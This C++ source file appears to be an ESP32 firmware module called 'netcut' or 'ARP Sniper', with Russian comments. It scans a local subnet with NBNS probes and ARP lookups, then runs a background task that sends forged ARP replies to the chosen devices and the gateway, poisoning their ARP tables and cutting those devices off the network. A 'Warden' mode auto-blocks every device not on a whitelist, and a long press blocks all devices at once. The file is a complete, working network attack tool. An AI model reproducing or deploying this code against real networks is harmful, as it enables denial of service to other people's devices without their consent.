#include "netcut.h"
#include "core/display.h"
#include "globals.h"
#include <SD.h>
#include <WiFiUdp.h>
#include <esp_netif.h>
#include <esp_wifi.h>
#include <lwip/etharp.h>
#include <lwip/netif.h>
#include <map>

// Системный вызов для отправки сырых Ethernet-кадров поверх WiFi
extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t wifi_if, void *buffer, uint16_t len);

std::vector<NetcutDevice> netcut_devices;
std::vector<String> blocked_macs_cache;   // Чёрный список
std::vector<String> whitelist_macs_cache; // Белый список (Warden)
bool netcut_running = false;
bool warden_enabled = false;
SemaphoreHandle_t netcut_mutex = NULL;

IPAddress gateway_ip;
uint8_t gateway_mac[6];
uint8_t my_mac[6];

// --- Работа со списками (SD Card) ---
void load_lists() {
    blocked_macs_cache.clear();
    whitelist_macs_cache.clear();

    // Грузим черный список
    File f_bl = SD.open("/netcut_bl.txt", FILE_READ);
    if (f_bl) {
        while (f_bl.available()) {
            String line = f_bl.readStringUntil('\n');
            line.trim();
            if (line.length() > 0) blocked_macs_cache.push_back(line);
        }
        f_bl.close();
    }

    // Грузим белый список
    File f_wl = SD.open("/netcut_wl.txt", FILE_READ);
    if (f_wl) {
        while (f_wl.available()) {
            String line = f_wl.readStringUntil('\n');
            line.trim();
            if (line.length() > 0) whitelist_macs_cache.push_back(line);
        }
        f_wl.close();
    }
}

void save_blacklist() {
    File f = SD.open("/netcut_bl.txt", FILE_WRITE);
    if (!f) return;
    xSemaphoreTake(netcut_mutex, portMAX_DELAY);
    for (const auto &dev : netcut_devices) {
        if (dev.is_blocked && !dev.is_gateway) {
            char macStr[18];
            snprintf(
                macStr,
                sizeof(macStr),
                "%02X:%02X:%02X:%02X:%02X:%02X",
                dev.mac[0],
                dev.mac[1],
                dev.mac[2],
                dev.mac[3],
                dev.mac[4],
                dev.mac[5]
            );
            f.println(macStr);
        }
    }
    xSemaphoreGive(netcut_mutex);
    f.close();
}

void save_whitelist() {
    File f = SD.open("/netcut_wl.txt", FILE_WRITE);
    if (!f) return;
    xSemaphoreTake(netcut_mutex, portMAX_DELAY);
    for (const auto &dev : netcut_devices) {
        // Сохраняем в белый список все НЕ заблокированные устройства (включая шлюз)
        if (!dev.is_blocked) {
            char macStr[18];
            snprintf(
                macStr,
                sizeof(macStr),
                "%02X:%02X:%02X:%02X:%02X:%02X",
                dev.mac[0],
                dev.mac[1],
                dev.mac[2],
                dev.mac[3],
                dev.mac[4],
                dev.mac[5]
            );
            f.println(macStr);
        }
    }
    xSemaphoreGive(netcut_mutex);
    f.close();
}

// Простой определитель вендора по OUI
String get_vendor_by_mac(const uint8_t *mac) {
    uint32_t oui = (mac[0] << 16) | (mac[1] << 8) | mac[2];
    switch (oui) {
        case 0x001A11:
        case 0xF4F5D8:
        case 0xF88FCA: return "Google";
        case 0x000393:
        case 0x286ABA:
        case 0x0017F2:
        case 0x001E52:
        case 0x002312:
        case 0x0025BC:
        case 0x04F13E:
        case 0x10DDB0:
        case 0x2CBE08:
        case 0x5855CA:
        case 0xDC5285: return "Apple";
        case 0x000C29:
        case 0x005056: return "VMware";
        case 0x001422:
        case 0x14FEB5:
        case 0x1866DA: return "Dell";
        case 0x0024E4:
        case 0xC006C3:
        case 0x14CC20:
        case 0x30B5C2:
        case 0x50C7BF:
        case 0x60E327:
        case 0x68FFA7:
        case 0x90F652:
        case 0x940C6D:
        case 0xA0F3C1:
        case 0xC4E984: return "TP-Link";
        case 0x00E04C:
        case 0x525400: return "Realtek";
        case 0x001018:
        case 0x0014B9: return "Broadcom";
        case 0x000142:
        case 0x000143:
        case 0x0014F2: return "Cisco";
        case 0x001132: return "Synology";
        case 0xCC50E3:
        case 0x001632:
        case 0x001E8C:
        case 0x002119:
        case 0x0023D6:
        case 0x1489FD:
        case 0x244B03:
        case 0x28987B: return "Samsung";
        case 0x3CA82A:
        case 0x001882:
        case 0x001E10:
        case 0x00259E:
        case 0x0819A6:
        case 0x104780:
        case 0x241FC6: return "Huawei";
        case 0xB827EB:
        case 0xDCA632:
        case 0xE45F01: return "Raspberry";
        case 0x009ECA:
        case 0x08A6BC:
        case 0x14F65A:
        case 0x286C07:
        case 0x34CE00:
        case 0x38400A:
        case 0x508CB1:
        case 0x640980: return "Xiaomi";
        case 0x18FE34:
        case 0x240AC4:
        case 0x2462AB:
        case 0x246F28:
        case 0x2C3AE8:
        case 0x30AEA4:
        case 0x3C71BF:
        case 0x483FDA:
        case 0x4C11AE:
        case 0x545AB6:
        case 0x5CCF7F:
        case 0x600194: return "Espressif";
        case 0x001500:
        case 0x001517:
        case 0x001C25:
        case 0x001E64:
        case 0x00215C:
        case 0x00216A:
        case 0x0022FB: return "Intel";
        case 0x00014A:
        case 0x00029B:
        case 0x000A4E:
        case 0x000E07:
        case 0x001315:
        case 0x0015B7:
        case 0xF8D0AC: return "Sony";
        case 0x0009BF:
        case 0x001656:
        case 0x0017AB:
        case 0x00191D:
        case 0x0019FD:
        case 0x001B7A:
        case 0x001CBE:
        case 0x98B6E9: return "Nintendo";
        case 0x000D3A:
        case 0x00125A:
        case 0x00155D:
        case 0x0017FA:
        case 0x001DD8:
        case 0x002248:
        case 0x0025AE:
        case 0x0050F2: return "Microsoft";
        case 0x00FC8B:
        case 0x0C47C9:
        case 0x18742E:
        case 0x34D270:
        case 0x38F73D:
        case 0x40B4CD:
        case 0x44650D:
        case 0x50DCE7: return "Amazon";
        case 0x001A79: return "Aerohive";
        default: return "Unknown";
    }
}

// Фаза 1: Инициализация и Захват шлюза
bool netcut_init() {
    if (WiFi.status() != WL_CONNECTED) {
        displayError("WiFi not connected!");
        vTaskDelay(1000 / portTICK_PERIOD_MS);
        return false;
    }

    if (netcut_mutex == NULL) { netcut_mutex = xSemaphoreCreateMutex(); }

    gateway_ip = WiFi.gatewayIP();
    esp_wifi_get_mac(WIFI_IF_STA, my_mac);

    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
        memcpy(gateway_mac, ap_info.bssid, 6);
    } else {
        displayError("Failed to get GW MAC");
        vTaskDelay(1000 / portTICK_PERIOD_MS);
        return false;
    }

    netcut_devices.clear();
    load_lists(); // Грузим Blacklist и Whitelist с SD

    // Если белый список не пуст при старте, считаем что Warden был включен
    warden_enabled = !whitelist_macs_cache.empty();

    return true;
}

// Фаза 2: Асинхронное Сканирование + Авто-Блок Warden
void netcut_start_scan(bool slow_mode) {
    drawMainBorderWithTitle("Scanning Subnet");
    padprintln(slow_mode ? "Slow Probing..." : "Fast Probing...");

    struct netif *netif = netif_default;
    if (netif == NULL) netif = netif_list;

    IPAddress base_ip = WiFi.localIP();
    WiFiUDP nbns_udp;
    nbns_udp.begin(137);

    const uint8_t nbns_req[50] = {0x13, 0x37, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
                                  0x00, 0x00, 0x20, 0x43, 0x4B, 0x41, 0x41, 0x41, 0x41, 0x41,
                                  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
                                  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
                                  0x41, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0x21, 0x00, 0x01};

    std::map<uint32_t, String> resolved_names;

    xSemaphoreTake(netcut_mutex, portMAX_DELAY);
    netcut_devices.clear();
    NetcutDevice gw_dev;
    gw_dev.ip = gateway_ip;
    memcpy(gw_dev.mac, gateway_mac, 6);
    gw_dev.vendor = get_vendor_by_mac(gateway_mac);
    gw_dev.hostname = gw_dev.vendor + " [Router]";
    gw_dev.is_blocked = false;
    gw_dev.is_gateway = true;
    netcut_devices.push_back(gw_dev);
    xSemaphoreGive(netcut_mutex);

    int batch_size = slow_mode ? 4 : 8;
    int wait_time = slow_mode ? 600 : 300;
    int retries = slow_mode ? 3 : 1;

    for (int r = 0; r < retries; r++) {
        nbns_udp.beginPacket(gateway_ip, 137);
        nbns_udp.write(nbns_req, sizeof(nbns_req));
        nbns_udp.endPacket();
    }

    int batch_start = 1;
    bool new_warden_blocks = false;

    while (batch_start < 255) {
        int batch_end = batch_start + batch_size;
        if (batch_end > 255) batch_end = 255;

        for (int r = 0; r < retries; r++) {
            for (int i = batch_start; i < batch_end; i++) {
                IPAddress ip = base_ip;
                ip[3] = i;
                if (ip == base_ip || ip == gateway_ip) continue;

                nbns_udp.beginPacket(ip, 137);
                nbns_udp.write(nbns_req, sizeof(nbns_req));
                nbns_udp.endPacket();
            }
            if (r < retries - 1) vTaskDelay(50 / portTICK_PERIOD_MS);
        }

        unsigned long wait_start = millis();
        while (millis() - wait_start < wait_time) {
            int packetSize = nbns_udp.parsePacket();
            if (packetSize > 57) {
                uint32_t remote_ip = nbns_udp.remoteIP();
                uint8_t buf[100];
                nbns_udp.read(buf, 100);
                if (buf[0] == 0x13 && buf[1] == 0x37) {
                    char hname[16] = {0};
                    memcpy(hname, &buf[57], 15);
                    String h = String(hname);
                    h.trim();
                    if (h.length() > 0) resolved_names[remote_ip] = h;
                }
            }
            vTaskDelay(10 / portTICK_PERIOD_MS);
        }

        xSemaphoreTake(netcut_mutex, portMAX_DELAY);
        for (int i = batch_start; i < batch_end; i++) {
            IPAddress ip = base_ip;
            ip[3] = i;
            if (ip == base_ip || ip == gateway_ip) continue;

            ip4_addr_t target_ip;
            IP4_ADDR(&target_ip, ip[0], ip[1], ip[2], ip[3]);

            struct eth_addr *eth_ret;
            const ip4_addr_t *ip_ret;

            if (netif && etharp_find_addr(netif, &target_ip, &eth_ret, &ip_ret) != -1) {
                NetcutDevice dev;
                dev.ip = ip;
                memcpy(dev.mac, eth_ret->addr, 6);
                dev.vendor = get_vendor_by_mac(dev.mac);

                if (resolved_names.count((uint32_t)ip)) {
                    dev.hostname = resolved_names[(uint32_t)ip];
                } else {
                    dev.hostname = dev.vendor;
                }

                dev.is_blocked = false;
                dev.is_gateway = false;
                char mStr[18];
                snprintf(
                    mStr,
                    sizeof(mStr),
                    "%02X:%02X:%02X:%02X:%02X:%02X",
                    dev.mac[0],
                    dev.mac[1],
                    dev.mac[2],
                    dev.mac[3],
                    dev.mac[4],
                    dev.mac[5]
                );

                // Проверка по ЧЕРНОМУ списку
                for (const String &b_mac : blocked_macs_cache) {
                    if (b_mac.equalsIgnoreCase(String(mStr))) {
                        dev.is_blocked = true;
                        break;
                    }
                }

                // ЛОГИКА NETWORK WARDEN (Белый список)
                if (warden_enabled && !dev.is_blocked) {
                    bool is_trusted = false;
                    for (const String &w_mac : whitelist_macs_cache) {
                        if (w_mac.equalsIgnoreCase(String(mStr))) {
                            is_trusted = true;
                            break;
                        }
                    }
                    // Если включен Надзиратель и устройства НЕТ в белом списке -> АВТОБЛОК
                    if (!is_trusted) {
                        dev.is_blocked = true;
                        new_warden_blocks = true;
                    }
                }

                bool exists = false;
                for (const auto &d : netcut_devices) {
                    if (d.ip == dev.ip) {
                        exists = true;
                        break;
                    }
                }
                if (!exists) netcut_devices.push_back(dev);
            }
        }
        xSemaphoreGive(netcut_mutex);

        tft.fillRect(10, tftHeight - 40, tftWidth - 20, 20, bruceConfig.bgColor);
        tft.setCursor(10, tftHeight - 40);
        tft.printf("Progress: %d/254", batch_end - 1);

        batch_start = batch_end;
    }

    xSemaphoreTake(netcut_mutex, portMAX_DELAY);
    if (resolved_names.count((uint32_t)gateway_ip) && !netcut_devices.empty()) {
        netcut_devices[0].hostname = resolved_names[(uint32_t)gateway_ip] + " [Router]";
    }
    xSemaphoreGive(netcut_mutex);

    // Если Warden автоматически заблокировал кого-то нового, обновляем черный список на SD
    if (new_warden_blocks) { save_blacklist(); }

    padprintln("\nScan complete!");
    vTaskDelay(800 / portTICK_PERIOD_MS);
}

// Глубокий резолв имен (Deep Resolve)
void netcut_resolve_names() {
    drawMainBorderWithTitle("ARP Sniper");
    padprintln("Deep Resolving...");

    WiFiUDP nbns_udp;
    nbns_udp.begin(137);

    const uint8_t nbns_req[50] = {0x13, 0x37, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
                                  0x00, 0x00, 0x20, 0x43, 0x4B, 0x41, 0x41, 0x41, 0x41, 0x41,
                                  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
                                  0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
                                  0x41, 0x41, 0x41, 0x41, 0x41, 0x00, 0x00, 0x21, 0x00, 0x01};

    int max_passes = 3;
    int pass_wait_time = 1500;

    for (int pass = 0; pass < max_passes; pass++) {
        xSemaphoreTake(netcut_mutex, portMAX_DELAY);
        for (const auto &dev : netcut_devices) {
            for (int r = 0; r < 2; r++) {
                nbns_udp.beginPacket(dev.ip, 137);
                nbns_udp.write(nbns_req, sizeof(nbns_req));
                nbns_udp.endPacket();
                vTaskDelay(20 / portTICK_PERIOD_MS);
            }
        }
        xSemaphoreGive(netcut_mutex);

        unsigned long wait_start = millis();
        while (millis() - wait_start < pass_wait_time) {
            int packetSize = nbns_udp.parsePacket();
            if (packetSize > 57) {
                uint32_t remote_ip = nbns_udp.remoteIP();
                uint8_t buf[100];
                nbns_udp.read(buf, 100);
                if (buf[0] == 0x13 && buf[1] == 0x37) {
                    char hname[16] = {0};
                    memcpy(hname, &buf[57], 15);
                    String h = String(hname);
                    h.trim();
                    if (h.length() > 0) {
                        xSemaphoreTake(netcut_mutex, portMAX_DELAY);
                        for (auto &dev : netcut_devices) {
                            if ((uint32_t)dev.ip == remote_ip) {
                                if (dev.is_gateway) {
                                    dev.hostname = h + " [Router]";
                                } else {
                                    dev.hostname = h;
                                }
                                break;
                            }
                        }
                        xSemaphoreGive(netcut_mutex);
                    }
                }
            }
            vTaskDelay(10 / portTICK_PERIOD_MS);

            int total_remaining =
                (max_passes * pass_wait_time) - ((pass * pass_wait_time) + (millis() - wait_start));
            tft.fillRect(10, tftHeight - 40, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight - 40);
            tft.printf("Deep Probe: %d ms", total_remaining > 0 ? total_remaining : 0);
        }
    }

    padprintln("\nResolving done!");
    vTaskDelay(800 / portTICK_PERIOD_MS);
}

// Фаза 4: Ядро Атаки (Zero-Allocation)
void arp_spoof_task(void *pvParameters) {
    uint8_t arp_frame[42] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest MAC
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src MAC
        0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06, 0x04,
        0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender MAC
        0x00, 0x00, 0x00, 0x00,                         // Sender IP
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Target MAC
        0x00, 0x00, 0x00, 0x00                          // Target IP
    };

    memcpy(&arp_frame[6], my_mac, 6);
    memcpy(&arp_frame[22], my_mac, 6);

    uint32_t gw_ip_raw = gateway_ip;

    while (netcut_running) {
        xSemaphoreTake(netcut_mutex, portMAX_DELAY);
        for (const auto &dev : netcut_devices) {
            if (dev.is_blocked && !dev.is_gateway) {
                uint32_t vic_ip_raw = dev.ip;

                memcpy(&arp_frame[0], dev.mac, 6);
                memcpy(&arp_frame[32], dev.mac, 6);
                memcpy(&arp_frame[28], &gw_ip_raw, 4);
                memcpy(&arp_frame[38], &vic_ip_raw, 4);
                esp_wifi_internal_tx(WIFI_IF_STA, arp_frame, 42);
                vTaskDelay(10 / portTICK_PERIOD_MS);

                memcpy(&arp_frame[0], gateway_mac, 6);
                memcpy(&arp_frame[32], gateway_mac, 6);
                memcpy(&arp_frame[28], &vic_ip_raw, 4);
                memcpy(&arp_frame[38], &gw_ip_raw, 4);
                esp_wifi_internal_tx(WIFI_IF_STA, arp_frame, 42);
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
        }
        xSemaphoreGive(netcut_mutex);
        vTaskDelay(2000 / portTICK_PERIOD_MS);
    }
    vTaskDelete(NULL);
}

// Фаза 5: Лечение сети
void netcut_heal_network() {
    netcut_running = false;
    vTaskDelay(500 / portTICK_PERIOD_MS);

    drawMainBorderWithTitle("Healing Network");
    padprintln("Restoring ARP tables...");

    uint8_t arp_frame[42] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00,
                             0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02,
                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    uint32_t gw_ip_raw = gateway_ip;

    xSemaphoreTake(netcut_mutex, portMAX_DELAY);
    for (int i = 0; i < 3; i++) {
        for (const auto &dev : netcut_devices) {
            if (dev.is_blocked && !dev.is_gateway) {
                uint32_t vic_ip_raw = dev.ip;

                memcpy(&arp_frame[0], dev.mac, 6);
                memcpy(&arp_frame[6], gateway_mac, 6);
                memcpy(&arp_frame[22], gateway_mac, 6);
                memcpy(&arp_frame[28], &gw_ip_raw, 4);
                memcpy(&arp_frame[32], dev.mac, 6);
                memcpy(&arp_frame[38], &vic_ip_raw, 4);
                esp_wifi_internal_tx(WIFI_IF_STA, arp_frame, 42);
                vTaskDelay(10 / portTICK_PERIOD_MS);

                memcpy(&arp_frame[0], gateway_mac, 6);
                memcpy(&arp_frame[6], dev.mac, 6);
                memcpy(&arp_frame[22], dev.mac, 6);
                memcpy(&arp_frame[28], &vic_ip_raw, 4);
                memcpy(&arp_frame[32], gateway_mac, 6);
                memcpy(&arp_frame[38], &gw_ip_raw, 4);
                esp_wifi_internal_tx(WIFI_IF_STA, arp_frame, 42);
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
        }
    }
    netcut_devices.clear();
    xSemaphoreGive(netcut_mutex);
}

// Фаза 3: Интерфейс и Машина Состояний
void netcut_app() {
    if (!netcut_init()) return;
    netcut_start_scan(false); // По умолчанию быстрое сканирование

    netcut_running = true;
    xTaskCreatePinnedToCore(arp_spoof_task, "arp_spoof", 4096, NULL, 1, NULL, 0);

    int selected_idx = 4; // По умолчанию курсор на первом девайсе (индекс 4)
    int virtual_btns = 4; // Количество верхних кнопок
    bool redraw = true;

    EscPress = false;

    while (!check(EscPress)) {
        if (check(NextPress) || check(DownPress)) {
            selected_idx++;
            redraw = true;
        }
        if (check(PrevPress) || check(UpPress)) {
            selected_idx--;
            redraw = true;
        }

        if (check(LongPress)) {
            xSemaphoreTake(netcut_mutex, portMAX_DELAY);
            for (auto &dev : netcut_devices) {
                if (!dev.is_gateway) dev.is_blocked = true;
            }
            xSemaphoreGive(netcut_mutex);

            save_blacklist();
            redraw = true;
        }

        if (check(SelPress)) {
            if (selected_idx == 0) {
                netcut_start_scan(false);
                selected_idx = virtual_btns;
                redraw = true;
            } else if (selected_idx == 1) {
                netcut_start_scan(true);
                selected_idx = virtual_btns;
                redraw = true;
            } else if (selected_idx == 2) {
                netcut_resolve_names();
                selected_idx = virtual_btns;
                redraw = true;
            } else if (selected_idx == 3) {
                // ПЕРЕКЛЮЧЕНИЕ WARDEN
                warden_enabled = !warden_enabled;
                if (warden_enabled) {
                    save_whitelist(); // Сохраняем текущих "зеленых" как своих
                    load_lists();     // Перезагружаем кэши в память
                } else {
                    SD.remove("/netcut_wl.txt"); // Удаляем белый список
                    whitelist_macs_cache.clear();
                }
                redraw = true;
            } else {
                bool should_save = false;
                int dev_idx = selected_idx - virtual_btns;

                xSemaphoreTake(netcut_mutex, portMAX_DELAY);
                if (!netcut_devices.empty() && dev_idx >= 0 && dev_idx < netcut_devices.size()) {
                    if (!netcut_devices[dev_idx].is_gateway) {
                        netcut_devices[dev_idx].is_blocked = !netcut_devices[dev_idx].is_blocked;
                        should_save = true;
                    } else {
                        displayError("Cannot block Gateway!", false);
                        vTaskDelay(500 / portTICK_PERIOD_MS);
                    }
                }
                xSemaphoreGive(netcut_mutex);

                if (should_save) { save_blacklist(); }
                redraw = true;
            }
        }

        xSemaphoreTake(netcut_mutex, portMAX_DELAY);
        int dev_count = netcut_devices.size();
        xSemaphoreGive(netcut_mutex);

        int total_items = dev_count + virtual_btns;

        if (selected_idx >= total_items) selected_idx = total_items > 0 ? total_items - 1 : 0;
        if (selected_idx < 0) selected_idx = 0;

        if (redraw) {
            drawMainBorderWithTitle("ARP Sniper");
            tft.setTextSize(1);

            int item_height = 20;
            int items_per_page = (tftHeight - 40) / item_height;
            if (items_per_page < 3) items_per_page = 3;

            xSemaphoreTake(netcut_mutex, portMAX_DELAY);
            int start_idx = (selected_idx / items_per_page) * items_per_page;

            for (int i = start_idx; i < min(start_idx + items_per_page, total_items); i++) {
                String mark = (i == selected_idx) ? "> " : "  ";

                // Отрисовка виртуальных кнопок
                if (i == 0) {
                    tft.setTextColor(i == selected_idx ? TFT_YELLOW : TFT_CYAN, bruceConfig.bgColor);
                    padprintln(mark + "[ FAST SCAN ]");
                } else if (i == 1) {
                    tft.setTextColor(i == selected_idx ? TFT_YELLOW : TFT_ORANGE, bruceConfig.bgColor);
                    padprintln(mark + "[ SLOW SCAN ]");
                } else if (i == 2) {
                    tft.setTextColor(i == selected_idx ? TFT_YELLOW : TFT_MAGENTA, bruceConfig.bgColor);
                    padprintln(mark + "[ DEEP RESOLVE ]");
                } else if (i == 3) {
                    uint16_t w_color = warden_enabled ? TFT_GREEN : TFT_DARKGREY;
                    tft.setTextColor(i == selected_idx ? TFT_YELLOW : w_color, bruceConfig.bgColor);
                    String w_status = warden_enabled ? "ON " : "OFF";
                    padprintln(mark + "[ WARDEN: " + w_status + " ]");
                }
                // Отрисовка реальных устройств
                else {
                    int dev_idx = i - virtual_btns;
                    String status = netcut_devices[dev_idx].is_blocked ? "[BLK]" : "[OK] ";
                    if (netcut_devices[dev_idx].is_gateway) status = "[GW] ";

                    uint16_t color = (i == selected_idx) ? TFT_YELLOW : TFT_WHITE;
                    if (netcut_devices[dev_idx].is_blocked) color = TFT_RED;
                    if (netcut_devices[dev_idx].is_gateway) color = TFT_GREEN;

                    tft.setTextColor(color, bruceConfig.bgColor);
                    padprintln(mark + status + netcut_devices[dev_idx].ip.toString());

                    tft.setTextColor(TFT_LIGHTGREY, bruceConfig.bgColor);
                    padprintln("     " + netcut_devices[dev_idx].hostname);
                }
            }
            xSemaphoreGive(netcut_mutex);

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            redraw = false;
        }

        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    netcut_heal_network();
}
